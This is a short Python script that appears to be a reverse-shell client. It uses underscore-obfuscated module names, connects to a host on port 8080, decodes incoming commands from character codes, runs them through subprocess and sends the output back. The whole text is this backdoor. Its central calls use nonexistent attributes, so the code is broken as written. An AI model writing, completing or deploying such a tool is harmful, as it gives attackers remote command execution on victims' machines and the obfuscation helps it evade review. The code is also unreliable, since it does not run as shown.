import sys as ___
import subprocess as _
import socket as __

H = '127.0.1.1'
P = 8080
s = __.socket(__.AF_INET, __.SOCK_STREAM)
s.connect((H, P))

while True:
    c = s.recv(1024).decode()
    if c.strip() == "exit":
        break
    o = _.___("".join([chr(int(x)) for x in c.split()]))
    s.send(o.___.encode())
s.close()
